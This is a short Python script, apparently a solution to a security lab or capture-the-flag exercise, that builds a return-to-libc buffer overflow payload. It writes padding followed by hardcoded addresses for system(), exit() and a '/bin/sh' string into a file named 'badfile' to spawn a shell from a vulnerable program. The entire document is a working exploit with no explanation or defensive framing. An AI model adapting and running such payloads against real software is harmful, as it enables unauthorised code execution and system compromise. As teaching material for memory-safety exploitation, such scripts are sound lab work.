
def p32(value):
    return (value).to_bytes(4, 'little')

str_addr = 0xffffd933 
sys_addr = 0xf7e27e10
ext_addr = 0xf7e1b060

payload = (0x18 + 4) * b'A' # 18 bytes until return
payload += p32(sys_addr) # return address
payload += p32(ext_addr) # second return address
payload += p32(str_addr) # string /bin/sh

with open('badfile', 'wb') as f:
    f.write(payload)
    f.close()
    print('[+] Voila!')